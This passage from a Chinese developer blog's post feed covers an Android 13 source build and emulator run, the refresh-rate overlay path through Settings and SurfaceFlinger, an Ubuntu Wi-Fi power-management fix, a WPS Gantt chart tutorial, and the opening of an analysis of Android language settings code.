into segfaults or other errors, try reducing your</span><br><span class="line">07:04:26 -j value.</span><br><span class="line">07:04:26 ************************************************************</span><br><span class="line">build/make/core/soong_config.mk:209: warning: BOARD_PLAT_PUBLIC_SEPOLICY_DIR has been deprecated. Use SYSTEM_EXT_PUBLIC_SEPOLICY_DIRS instead.</span><br><span class="line">build/make/core/soong_config.mk:210: warning: BOARD_PLAT_PRIVATE_SEPOLICY_DIR has been deprecated. Use SYSTEM_EXT_PRIVATE_SEPOLICY_DIRS instead.</span><br><span class="line">============================================</span><br><span class="line">PLATFORM_VERSION_CODENAME=REL</span><br><span class="line">......</span><br><span class="line">[ 99% 120038/120059] //frameworks/base/packages/SystemUI:SystemUI-core javac</span><br><span class="line">注: 某些输入文件使用或覆盖了已过时的 API。</span><br><span class="line">注: 有关详细信息, 请使用 -Xlint:deprecation 重新编译。</span><br><span class="line">注: 某些输入文件使用了未经检查或不安全的操作。</span><br><span class="line">注: 有关详细信息, 请使用 -Xlint:unchecked 重新编译。</span><br><span class="line">[ 99% 120044/120059] //frameworks/base/packages/SystemUI:SystemUI r8</span><br><span class="line">Warning: Missing class android.compat.annotation.UnsupportedAppUsage (referenced from: void com.android.systemui.people.widget.PeopleBackupHelper.writeNewStateDescription(android.os.ParcelFileDescriptor))</span><br><span class="line">[100% 120059/120059] Target vbmeta image: out/target/product/generic/vbmeta.img</span><br><span class="line"></span><br><span class="line">#### build completed successfully (05:56:23 (hh:mm:ss)) ####</span><br></pre></td></tr></table></figure><p>如果一切顺利的化,在几个小时之后,便可以编译完成.看到### make completed successfully (00:48:15(hh:mm:ss)) ###表示你编译成功了.。Google 使用 72 核机器，内置 RAM 为 64 GB，完整构建过程大约需要 40 分钟（增量构建只需几分钟时间，具体取决于修改了哪些文件）。相比之下，RAM 数量相近的 6 核机器执行完整构建过程需要 3 个小时。</p><h1 id="二-运行模拟器"><a href="#二-运行模拟器" class="headerlink" title="二 运行模拟器"></a>二 运行模拟器</h1><p>在编译完成之后,就可以通过以下命令运行Android虚拟机了,命令如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">source build/envsetup.sh</span><br><span class="line">lunch   // 选择刚才你设置的目标版本,比如这里了我选择的是2</span><br><span class="line">emulator</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidt$ source build/envsetup.sh</span><br><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidt$ lunch</span><br><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidt$ emulator</span><br></pre></td></tr></table></figure><p>不出意外,在等待一会之后,你会看到运行界面</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android13实时刷新频率的实现代码</title>
      <link href="/2023/05/14/2023-05-14/"/>
      <url>/2023/05/14/2023-05-14/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/20230514/20230514143155.jpg"><br>设置-&gt;开发者选项-&gt;显示刷新频率<br><strong>packages/apps/Settings/src/com/android/settings/development/ShowRefreshRatePreferenceController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShowRefreshRatePreferenceController</span> <span class="keyword">extends</span> <span class="title class_">DeveloperOptionsPreferenceController</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Preference</span>.OnPreferenceChangeListener, PreferenceControllerMixin &#123;</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SETTING_VALUE_QUERY</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SETTING_VALUE_ON</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SETTING_VALUE_OFF</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@VisibleForTesting</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SURFACE_FLINGER_SERVICE_KEY</span> <span class="operator">=</span> <span class="string">&quot;SurfaceFlinger&quot;</span>;</span><br><span class="line">    <span class="meta">@VisibleForTesting</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SURFACE_FLINGER_CODE</span> <span class="operator">=</span> <span class="number">1034</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SURFACE_COMPOSER_INTERFACE_KEY</span> <span class="operator">=</span> <span class="string">&quot;android.ui.ISurfaceComposer&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> IBinder mSurfaceFlinger;</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onPreferenceChange</span><span class="params">(Preference preference, Object newValue)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">isEnabled</span> <span class="operator">=</span> (Boolean) newValue;</span><br><span class="line">        writeShowRefreshRateSetting(isEnabled);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateState</span><span class="params">(Preference preference)</span> &#123;</span><br><span class="line">        updateShowRefreshRateSetting();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    <span class="meta">@VisibleForTesting</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">updateShowRefreshRateSetting</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// magic communication with surface flinger.</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (mSurfaceFlinger != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">Parcel</span> <span class="variable">data</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line">                <span class="keyword">final</span> <span class="type">Parcel</span> <span class="variable">reply</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line">                data.writeInterfaceToken(SURFACE_COMPOSER_INTERFACE_KEY);</span><br><span class="line">                data.writeInt(SETTING_VALUE_QUERY);</span><br><span class="line">                mSurfaceFlinger.transact(SURFACE_FLINGER_CODE, data, reply, <span class="number">0</span> <span class="comment">/* flags */</span>); <span class="comment">// 调用 SurfaceFlinger::onTransact 中 1034 方法</span></span><br><span class="line">                <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">enabled</span> <span class="operator">=</span> reply.readBoolean();    <span class="comment">// 通过 SurfaceFlinger 获取 mRefreshRateOverlay != null判断显示是否打开</span></span><br><span class="line">                ((SwitchPreference) mPreference).setChecked(enabled);</span><br><span class="line">                reply.recycle();</span><br><span class="line">                data.recycle();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException ex) &#123;</span><br><span class="line">            <span class="comment">// intentional no-op</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@VisibleForTesting</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">writeShowRefreshRateSetting</span><span class="params">(<span class="type">boolean</span> isEnabled)</span> &#123;   <span class="comment">// 设置打开显示刷新频率</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (mSurfaceFlinger != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">Parcel</span> <span class="variable">data</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line">                data.writeInterfaceToken(SURFACE_COMPOSER_INTERFACE_KEY);</span><br><span class="line">                <span class="keyword">final</span> <span class="type">int</span> <span class="variable">showRefreshRate</span> <span class="operator">=</span> isEnabled ? SETTING_VALUE_ON : SETTING_VALUE_OFF;</span><br><span class="line">                data.writeInt(showRefreshRate);</span><br><span class="line">                mSurfaceFlinger.transact(SURFACE_FLINGER_CODE, data,</span><br><span class="line">                        <span class="literal">null</span> <span class="comment">/* reply */</span>, <span class="number">0</span> <span class="comment">/* flags */</span>);</span><br><span class="line">                data.recycle();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException ex) &#123;</span><br><span class="line">            <span class="comment">// intentional no-op</span></span><br><span class="line">        &#125;</span><br><span class="line">        updateShowRefreshRateSetting();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RefreshRateOverlay实际Layer显示刷新频率<br><strong>frameworks\native\services\surfaceflinger\SurfaceFlinger.cpp</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">namespace &#123;</span><br><span class="line">    ......</span><br><span class="line">status_t SurfaceFlinger::onTransact(uint32_t code, const Parcel&amp; data, Parcel* reply,</span><br><span class="line">                                    uint32_t flags) &#123;</span><br><span class="line">    if (const status_t error = CheckTransactCodeCredentials(code); error != OK) &#123;</span><br><span class="line">        return error;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    status_t err = BnSurfaceComposer::onTransact(code, data, reply, flags);</span><br><span class="line">    if (err == UNKNOWN_TRANSACTION || err == PERMISSION_DENIED) &#123;</span><br><span class="line">        CHECK_INTERFACE(ISurfaceComposer, data, reply);</span><br><span class="line">        IPCThreadState* ipc = IPCThreadState::self();</span><br><span class="line">        const int uid = ipc-&gt;getCallingUid();</span><br><span class="line">        if(code == 8002) &#123;</span><br><span class="line">            reply-&gt;writeInt32(mScheduler-&gt;getDfrcFps());</span><br><span class="line">            return NO_ERROR;</span><br><span class="line">        &#125;</span><br><span class="line">        if (CC_UNLIKELY(uid != AID_SYSTEM</span><br><span class="line">                &amp;&amp; !PermissionCache::checkCallingPermission(sHardwareTest))) &#123;</span><br><span class="line">            const int pid = ipc-&gt;getCallingPid();</span><br><span class="line">            ALOGE(&quot;Permission Denial: &quot;</span><br><span class="line">                    &quot;can&#x27;t access SurfaceFlinger pid=%d, uid=%d&quot;, pid, uid);</span><br><span class="line">            return PERMISSION_DENIED;</span><br><span class="line">        &#125;</span><br><span class="line">        int n;</span><br><span class="line">        switch (code) &#123;</span><br><span class="line">            ......</span><br><span class="line">            case 1034: &#123;</span><br><span class="line">                auto future = mScheduler-&gt;schedule([&amp;] &#123;</span><br><span class="line">                    switch (n = data.readInt32()) &#123;</span><br><span class="line">                        case 0:</span><br><span class="line">                        case 1:</span><br><span class="line">                            FTL_FAKE_GUARD(mStateLock,</span><br><span class="line">                                           enableRefreshRateOverlay(static_cast&lt;bool&gt;(n)));</span><br><span class="line">                            break;</span><br><span class="line">                        default: &#123;</span><br><span class="line">                            reply-&gt;writeBool(</span><br><span class="line">                                    FTL_FAKE_GUARD(mStateLock, isRefreshRateOverlayEnabled()));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line">                future.wait();</span><br><span class="line">                return NO_ERROR;</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">void SurfaceFlinger::enableRefreshRateOverlay(bool enable)</span><br><span class="line">&#123;</span><br><span class="line">    for (const auto&amp; [ignored, display] : mDisplays) &#123;</span><br><span class="line">        if (display-&gt;isInternal() &amp;&amp; !display-&gt;isVirtual()) &#123;</span><br><span class="line">            if (enable) &#123;</span><br><span class="line">                auto fpsRange = display-&gt;refreshRateConfigs().getSupportedRefreshRateRange();</span><br><span class="line">                mRefreshRateOverlay = std::make_shared&lt;RefreshRateOverlay&gt;(fpsRange, mRefreshRateOverlaySpinner);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                mRefreshRateOverlay.reset(); //disable RefreshRateOverlay</span><br><span class="line">            &#125;</span><br><span class="line">            display-&gt;enableRefreshRateOverlay(mRefreshRateOverlay);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">            ......</span><br></pre></td></tr></table></figure><p>初始化RefreshRateOverlay<br><strong>frameworks\native\services\surfaceflinger\RefreshRateOverlay.cpp</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">RefreshRateOverlay::RefreshRateOverlay(FpsRange fpsRange, bool showSpinner)</span><br><span class="line">      : mFpsRange(fpsRange),</span><br><span class="line">        mShowSpinner(showSpinner),</span><br><span class="line">        mSurfaceControl(SurfaceComposerClient::getDefault()</span><br><span class="line">                                -&gt;createSurface(String8(&quot;RefreshRateOverlay&quot;), kBufferWidth,</span><br><span class="line">                                                kBufferHeight, PIXEL_FORMAT_RGBA_8888,</span><br><span class="line">                                                ISurfaceComposerClient::eFXSurfaceBufferState)) &#123;</span><br><span class="line">    if (!mSurfaceControl) &#123;</span><br><span class="line">        ALOGE(&quot;%s: Failed to create buffer state layer&quot;, __func__);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    createTransaction(mSurfaceControl)</span><br><span class="line">            .setLayer(mSurfaceControl, INT32_MAX - 2)</span><br><span class="line">            .setTrustedOverlay(mSurfaceControl, true)</span><br><span class="line">            .apply();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Framework </tag>
            
            <tag> Settings </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决Ubuntu22.04 Wifi连接断开的问题</title>
      <link href="/2023/05/13/2023-05-13/"/>
      <url>/2023/05/13/2023-05-13/</url>
      
        <content type="html"><![CDATA[<h2 id="1-修改-etc-ppp-options文件"><a href="#1-修改-etc-ppp-options文件" class="headerlink" title="1.修改/etc/ppp/options文件"></a>1.修改/etc/ppp/options文件</h2><p>将其中的lcpe-echo-failure 的参数改为40</p><h2 id="2-将无线网卡的power-management-关掉"><a href="#2-将无线网卡的power-management-关掉" class="headerlink" title="2.将无线网卡的power management 关掉"></a>2.将无线网卡的power management 关掉</h2><h1 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ sudo iwconfig</span><br><span class="line">    lo        no wireless extensions.</span><br><span class="line">   </span><br><span class="line">    wlp5s0    IEEE 802.11  ESSID:&quot;\xE7\xA6\x8F\xE7\xBC\x98\xE5\x96\x84\xE5\xBA\x86&quot;  </span><br><span class="line">              Mode:Managed  Frequency:2.472 GHz  Access Point: 44:97:5A:04:87:DA  </span><br><span class="line">              Bit Rate=15 Mb/s   Tx-Power=22 dBm  </span><br><span class="line">              Retry short limit:7   RTS thr:off   Fragment thr:off</span><br><span class="line">              Encryption key:off</span><br><span class="line">              Power Management:off</span><br><span class="line">              Link Quality=22/70  Signal level=-88 dBm  </span><br><span class="line">              Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0</span><br><span class="line">              Tx excessive retries:0  Invalid misc:18   Missed beacon:0</span><br><span class="line">   </span><br><span class="line">    enp4s0    no wireless extensions.</span><br><span class="line"># 关闭</span><br><span class="line">$ sudo iwconfig wlp5s0 power off</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WPS表格甘特图制作教程</title>
      <link href="/2023/04/29/2023-04-29/"/>
      <url>/2023/04/29/2023-04-29/</url>
      
        <content type="html"><![CDATA[<h2 id="1-准备数据表格"><a href="#1-准备数据表格" class="headerlink" title="1.准备数据表格"></a>1.准备数据表格</h2><p>新建一个空白表格，输入文字和数字。</p><p><img src="/images/20230429/202304291412001.png"></p><h2 id="2-插入图表"><a href="#2-插入图表" class="headerlink" title="2.插入图表"></a>2.插入图表</h2><p>框选单元格B3-D8的所有内容。点击“插入”再点击“全部图表”。在弹出的页面上，单击选中“条形图”，再双击“堆积条形图”。 插入“堆积条形图”后效果如下图所示。</p><p><img src="/images/20230429/202304291412002.png"></p><p><img src="/images/20230429/202304291412003.png"></p><h2 id="3-选择数据"><a href="#3-选择数据" class="headerlink" title="3.选择数据"></a>3.选择数据</h2><p>单击“图表工具”再单击“选择数据”。在“编辑数据源”弹出框中点击“ ”添加。</p><p><img src="/images/20230429/202304291412004.png"></p><p><img src="/images/20230429/202304291412005.png"></p><p>在“编辑数据系列”，输入系列名称，这里输入的是“开始时间” ，然后删除系列值里原来的内容，单击系列值后面的按钮 框选 单元格C4-C8，点击 “确定”。</p><p><img src="/images/20230429/202304291412006.png"></p><p>先选择“开始时间”，再单击 向上箭头。然后单击类别右边的“编辑”按钮。如下图所示。</p><p><img src="/images/20230429/202304291412007.png"></p><p>在“轴标签”页面上，点击框选按钮，框选单元格B4-B8，将轴标签区域改为“项目一、项目二、项目三、项目四”。完成以上操作后，效果如下图所示。</p><p><img src="/images/20230429/202304291412008.png"></p><p><img src="/images/20230429/202304291412009.png"></p><h2 id="4-调整条形图"><a href="#4-调整条形图" class="headerlink" title="4.调整条形图"></a>4.调整条形图</h2><p>选中项目名称所在的坐标轴。在右边的属性面板上，单击选择“坐标轴”再勾选“逆序类别”图表上下做个调整。</p><p><img src="/images/20230429/202304291412010.png"></p><p>框选 C12 和 C13，这两个单元格，右键单击选择设置单元格格式，在弹出的页面上，选择“常规”。单击 “确定”。</p><p><img src="/images/20230429/202304291412011.png"></p><p><img src="/images/20230429/202304291412012.png"></p><p>双击上方日期的坐标轴，点击“坐标轴选项”，再点击“坐标轴” 填入日期最小值、日期最大值，设置坐标轴合适的主要单位。</p><p><img src="/images/20230429/202304291412013.png"></p><p>双击条形前端，在页面右侧。点击“图表选项”—&gt;“填充与线条”，选择“填充”—&gt;“无填充”。</p><p><img src="/images/20230429/202304291412014.png"></p><p>双击网格线，在图表右边出现的小工具内点击“图表元素”。依次选择“网格线”—勾选“主轴主要水平网格线”和“主轴主要垂直网格线”。</p><p><img src="/images/20230429/202304291412015.png"></p><p>选择其中的一条网格线。在右侧的“主要网格线选项中”选择“填充与线条”—&gt;“线条”根据需要进行设置。双击条形图，在右侧“系列选项”中选择“填充与线条”，调整你需要的“颜色”。制作完成后，效果如下图所示。</p><p><img src="/images/20230429/202304291412016.png"></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WPS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android Settings(设置)语言的切换和添加原理流程简析</title>
      <link href="/2023/04/22/2023-04-22/"/>
      <url>/2023/04/22/2023-04-22/</url>
      
        <content type="html"><![CDATA[<h2 id="Settings-部分"><a href="#Settings-部分" class="headerlink" title="Settings 部分"></a>Settings 部分</h2><h3 id="切换流程"><a href="#切换流程" class="headerlink" title="切换流程"></a>切换流程</h3><p>首先是语言和输入的设置界面<br><strong>src/com/android/settings/language/LanguageAndInputSettings.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="comment">// 注释1_1：加载了language_and_input 这个布局文件</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">getPreferenceScreenResId</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> R.xml.language_and_input;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后看下<strong>language_and_input.xml</strong>这个布局文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">PreferenceScreen</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:settings</span>=<span class="string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:title</span>=<span class="string">&quot;@string/language_settings&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 注释1_2: 这里的 phone_language 即对应着 界面上的语言选项 </span></span><br><span class="line"><span class="comment">             下面的 keyboards_category 则对应着键盘的设置选项</span></span><br><span class="line"><span class="comment">             注意：这里的 fragment 属性设置的是com.android.settings.localepicker.LocaleListEditor</span></span><br><span class="line"><span class="comment">             即我们点开语言选项，即由这个页面来实现--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Preference</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:key</span>=<span class="string">&quot;phone_language&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:title</span>=<span class="string">&quot;@string/phone_language&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">&quot;@drawable/ic_translate_24dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:fragment</span>=<span class="string">&quot;com.android.settings.localepicker.LocaleListEditor&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">PreferenceCategory</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:key</span>=<span class="string">&quot;keyboards_category&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:title</span>=<span class="string">&quot;@string/keyboard_and_input_methods_category&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Preference</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:key</span>=<span class="string">&quot;virtual_keyboard_pref&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:title</span>=<span class="string">&quot;@string/virtual_keyboard_category&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:fragment</span>=<span class="string">&quot;com.android.settings.inputmethod.VirtualKeyboardFragment&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">settings:keywords</span>=<span class="string">&quot;@string/keywords_virtual_keyboard&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Preference</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:key</span>=<span class="string">&quot;physical_keyboard_pref&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:title</span>=<span class="string">&quot;@string/physical_keyboard_title&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:summary</span>=<span class="string">&quot;@string/summary_placeholder&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:fragment</span>=<span class="string">&quot;com.android.settings.inputmethod.PhysicalKeyboardFragment&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">PreferenceCategory</span>&gt;</span></span><br><span class="line">    ......</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>另外，Settings里的界面基本都是Preference(界面xml) 和 xxxController(数据逻辑管理) ,语言的controller 是 <strong>PhoneLanguagePreferenceController</strong> ，具体这里不再详细展开。</p><p>多语言的切换和添加页面：<br><strong>src/com/android/settings/localepicker/LocaleListEditor.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 